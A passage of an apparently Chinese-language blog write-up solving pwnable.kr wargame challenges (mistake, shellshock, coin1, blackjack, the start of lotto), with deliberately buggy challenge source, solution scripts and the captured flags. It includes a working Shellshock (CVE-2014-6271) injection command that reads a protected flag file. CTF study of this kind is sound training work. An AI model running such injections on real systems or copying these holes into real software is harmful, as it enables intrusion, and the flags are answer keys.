</span><span class="c"></span><span class="mi">0x00008d38</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bx</span>  <span class="no">lr</span>
</code></pre></td></tr></table>
</div>
</div><p><code>mov r3, lr</code> r3的值为lr的值</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">0</span><span class="nf">x00008d7c</span> <span class="err">&lt;+</span><span class="mi">64</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bl</span>  <span class="mh">0x8d20</span> <span class="p">&lt;</span><span class="no">key3</span><span class="p">&gt;</span>
<span class="err">0</span><span class="nf">x00008d80</span> <span class="err">&lt;+</span><span class="mi">68</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span> <span class="no">r3</span><span class="p">,</span> <span class="no">r0</span>
</code></pre></td></tr></table>
</div>
</div><p>看下 main 函数的反汇编, 可以发现下一条指令的地址为 0x8d80</p>
<p>那么返回值就是 0x8d80 了</p>
<p>最终结果 0x8ce4+0x8d0c+0x8d80=108400</p>
<p>输入得到flag <code>My daddy has a lot of ARMv5te muscle!</code></p>
<h1 id="mistake">mistake</h1>
<blockquote>
<p>We all make mistakes, let&rsquo;s move on.
(don&rsquo;t take this too seriously, no fancy hacking skill is required at all)</p>
<p>This task is based on real event
Thanks to dhmonkey</p>
<p>hint : operator priority</p>
<p>ssh <a href="mailto:mistake@pwnable.kr">mistake@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>提示我们这个地方不需要任何 fancy 的 hacking skill, 并且基于真实事件</p>
<p>还提示了我们这个是和符号优先级有关的错误</p>
<p>mistake.c</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#define PW_LEN 10
</span><span class="cp">#define XORKEY 1
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">xor</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">XORKEY</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>

    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="n">open</span><span class="p">(</span><span class="s">&#34;/home/mistake/password&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">,</span><span class="mo">0400</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;can&#39;t open password %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;do not bruteforce...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">sleep</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="p">);</span>

    <span class="kt">char</span> <span class="n">pw_buf</span><span class="p">[</span><span class="n">PW_LEN</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">len</span><span class="o">=</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">pw_buf</span><span class="p">,</span><span class="n">PW_LEN</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;read error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">char</span> <span class="n">pw_buf2</span><span class="p">[</span><span class="n">PW_LEN</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;input password : &#34;</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%10s&#34;</span><span class="p">,</span> <span class="n">pw_buf2</span><span class="p">);</span>

    <span class="c1">// xor your input
</span><span class="c1"></span>    <span class="n">xor</span><span class="p">(</span><span class="n">pw_buf2</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">pw_buf</span><span class="p">,</span> <span class="n">pw_buf2</span><span class="p">,</span> <span class="n">PW_LEN</span><span class="p">)){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Password OK</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Wrong Password</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>题目要求我们输入一个10位密码, 每位与1异或以后再判断是否和./password文件中的密码相等(这个文件我们没有权限读取)</p>
<p>并且为了防止爆破加上了延时</p>
<p>题目已经提醒了是符号优先级, 我们把代码读一遍就可以发现
<code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>
这行代码是存在问题的</p>
<p><code>=</code>的优先级小于<code>&lt;</code>, 所以这段代码相当于将 <code>open(&quot;...&quot;) &lt; 0</code> 的值赋给了fd, fd的值只有0和1两种可能</p>
<p>既然我们能够正常执行, 那这个地方就是1了, 为1的话看起来是从 stdout 中读取数据, 不过在控制台中似乎效果和 stdin 是一样的</p>
<p>那么这个地方就相当于我们可以控制密码的值, 随便找个数挨位异或一下</p>
<p>如 0325476981 和 1234567890, 然后执行./mistake,
等光标不闪的时候先后输入这两个数</p>
<p>flag: <code>Mommy, the operator priority always confuses me :(</code></p>
<h1 id="shellshock">shellshock</h1>
<blockquote>
<p>Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)</p>
<p>ssh <a href="mailto:shellshock@pwnable.kr">shellshock@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>和 bash 有关? 沙盒逃逸之类的么</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">shellshock@ubuntu:~$ ls -l
total 960
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">setresuid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
    <span class="n">setresgid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/home/shellshock/bash -c &#39;echo shock_me&#39;&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>一脸懵逼地看着代码</p>
<p>查了一下,getegid, setresuid, setresgid, 还是不明白它在干什么, 我该怎么下手?</p>
<p>后来看到题目简介, 说是 a shocking news about bash</p>
<p>莫非是漏洞?</p>
<p>于是用 &ldquo;bash uid 漏洞&rdquo; 为关键词搜索, 果然搜索到了: <a href="https://bbs.aliyun.com/read/177039.html?page=e">bash漏洞最新补丁可被绕过</a></p>
<p>在shell中执行代码 <code>env x='() { :;}; /bin/cat flag' ./shellshock</code></p>
<p>flag: <code>only if I knew CVE-2014-6271 ten years ago..!!</code></p>
<p>我十年前就知道CVE-2014-6271就好了!!</p>
<h1 id="coin1">coin1</h1>
<blockquote>
<p>Mommy, I wanna play a game!
(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)</p>
<p>Running at : nc pwnable.kr 9007</p>
</blockquote>
<p>不详的预感</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">---------------------------------------------------
-              Shall we play a game?              -
---------------------------------------------------

You have given some gold coins in your hand
however, there is one counterfeit coin among them
counterfeit coin looks exactly same as real coin
however, its weight is different from real one
real coin weighs 10, counterfeit coin weighes 9
help me to find the counterfeit coin with a scale
if you find 100 counterfeit coins, you will get reward :)
FYI, you have 30 seconds.

- How to play -
1. you get a number of coins (N) and number of chances (C)
2. then you specify a set of index numbers of coins to be weighed
3. you get the weight information
4. 2~3 repeats C time, then you give the answer

- Example -
[Server] N=4 C=2    # find counterfeit among 4 coins with 2 trial
[Client] 0 1        # weigh first and second coin
[Server] 20         # scale result : 20
[Client] 3          # weigh fourth coin
[Server] 10         # scale result : 10
[Client] 2          # counterfeit coin is third!
[Server] Correct!

- Ready? starting in 3 sec... -
</code></pre></td></tr></table>
</div>
</div><p>N个硬币中有1个假币, 要你称出来</p>
<p>简单的二分, 直接上脚本</p>
<p>需要注意的是在自己电脑上跑延迟太高30s内跑到100根本不可能, 随便放到哪道题的服务器上跑比较好</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="c1"># context.log_level = &#39;DEBUG&#39;</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="mi">9007</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;- Ready? starting in 3 sec... -&#39;</span><span class="p">)</span>


<span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="n">N</span><span class="p">,</span> <span class="n">C</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\d+&#39;</span><span class="p">,</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline_startswith</span><span class="p">(</span><span class="s1">&#39;N=&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;{}.N={} C={}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">N</span><span class="p">,</span> <span class="n">C</span><span class="p">))</span>
    <span class="n">N</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">N</span><span class="p">))]</span>

    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">C</span><span class="p">)):</span>
        <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">N</span><span class="p">)</span>
        <span class="n">left</span>  <span class="o">=</span> <span class="n">N</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">length</span><span class="o">//</span><span class="mi">2</span><span class="p">]</span>
        <span class="n">right</span> <span class="o">=</span> <span class="n">N</span><span class="p">[</span><span class="n">length</span><span class="o">//</span><span class="mi">2</span><span class="p">:</span><span class="n">length</span><span class="p">]</span>

        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">N</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">left</span><span class="p">))</span>
            <span class="n">weight</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>

            <span class="k">if</span> <span class="n">weight</span> <span class="o">!=</span> <span class="mi">10</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">left</span><span class="p">):</span>
                <span class="n">N</span> <span class="o">=</span> <span class="n">left</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">N</span> <span class="o">=</span> <span class="n">right</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>

    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;ANS:{}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">N</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">N</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>flag: <code>b1NaRy_S34rch1nG_1s_3asy_p3asy</code></p>
<p>这是最像flag的一个flag了</p>
<h1 id="blackjack">blackjack</h1>
<blockquote>
<p>Hey! check out this C implementation of blackjack game!
I found it online</p>
<ul>
<li><a href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html">http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</a></li>
</ul>
<p>I like to give my flags to millionares.
how much money you got?</p>
<p>Running at : nc pwnable.kr 9009</p>
</blockquote>
<p>代码将近800行</p>
<p>原先以为要写个C程序一直赢赢到百万富翁</p>
<p>后来觉得太扯了</p>
<p>仔细看代码是有漏洞的, 下注的地方原本不能下比自己当前现金还多的注,
但这个地方让用户第二次输入时没有进行校验, 导致了第二次可以输入任意金额</p>
<p>输入一个特大的注, 多玩几次就能得到flag了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">betting</span><span class="p">()</span> <span class="c1">//Asks user amount to bet
</span><span class="c1"></span><span class="p">{</span>
 <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n\n</span><span class="s">Enter Bet: $&#34;</span><span class="p">);</span>
 <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bet</span><span class="p">);</span>

 <span class="k">if</span> <span class="p">(</span><span class="n">bet</span> <span class="o">&gt;</span> <span class="n">cash</span><span class="p">)</span> <span class="c1">//If player tries to bet more money than player has
</span><span class="c1"></span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">You cannot bet more money than you have.&#34;</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Enter Bet: &#34;</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bet</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">bet</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="k">else</span> <span class="k">return</span> <span class="n">bet</span><span class="p">;</span>
<span class="p">}</span> <span class="c1">// End Function
</span></code></pre></td></tr></table>
</div>
</div><p>flag: <code>YaY_I_AM_A_MILLIONARE_LOL</code></p>
<p>P.S. 看了一下大佬们的WP, 原来还可以输入负数&hellip;.然后故意输掉&hellip;.. 高,
实在是高!</p>
<h1 id="lotto">lotto</h1>
<blockquote>
<p>Mommy! I made a lotto program for my homework.
do you want to play?</p>
<p>ssh <a href="mailto:lotto@pwnable.kr">lotto@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>大乐透?</p>
<p>lotto.c</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span><span class="lnt">96
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">submit</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>

<span class="kt">void</span> <span class="nf">play</span><span class="p">(){</span>

    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Submit your 6 lotto bytes : &#34;</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">r</span><span class="p">;</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">submit</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Lotto Start!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="c1">//sleep(1);
</span><span class="c1"></span>
    <span class="c1">// generate lotto numbers
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/urandom&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">==-</span><span class="mi">1</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;error. tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">lotto</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">lotto</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;error2. tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">%</span> <span class="mi">45</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>     <span class="c1">// 1 ~ 45
</span><span class="c1"></span>    <span class="p">}</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

    <span class="c1">// calculate lotto score
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">match</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">){</span>
            <span class="k">if</span><span class="p">(</span><span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">submit</span><span class="p">[</span><span class="n">j</span><span class="p">]){</span>
                <span class="n">match</span><span class="o">++</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// win!
</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="n">match</span> <span class="o">==</span> <span class="mi">6</span><span class="p">){</span>
        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;bad luck...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="kt">void</span> <span class="nf">help</span><span class="p">(){</span>
